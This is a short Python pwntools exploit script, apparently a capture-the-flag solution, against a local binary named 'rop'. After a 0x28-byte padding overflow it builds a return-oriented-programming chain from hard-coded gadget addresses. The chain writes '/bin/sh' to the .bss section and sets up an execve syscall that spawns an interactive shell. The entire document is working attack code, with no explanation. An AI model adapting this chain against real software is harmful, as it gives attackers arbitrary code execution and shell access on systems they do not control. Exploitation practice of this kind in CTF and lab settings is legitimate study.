#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

r = process( './rop' )

bss = 0x4b92e0
pop_rdi = 0x401736
pop_rsi = 0x406c70
pop_rdx = 0x446cc5
pop_rax = 0x4476fc
mov_rdi_rsi = 0x44440b # mov qword ptr [rdi], rsi ; ret
syscall = 0x4721c5

p = flat(
    '\x00' * 0x28,
    pop_rsi,
    u64( '/bin/sh\x00' ),
    pop_rdi,
    bss,
    mov_rdi_rsi,
    pop_rsi,
    0x0,
    pop_rdx,
    0x0,
    pop_rax,
    0x3b,
    syscall
)

r.send( p )

r.interactive()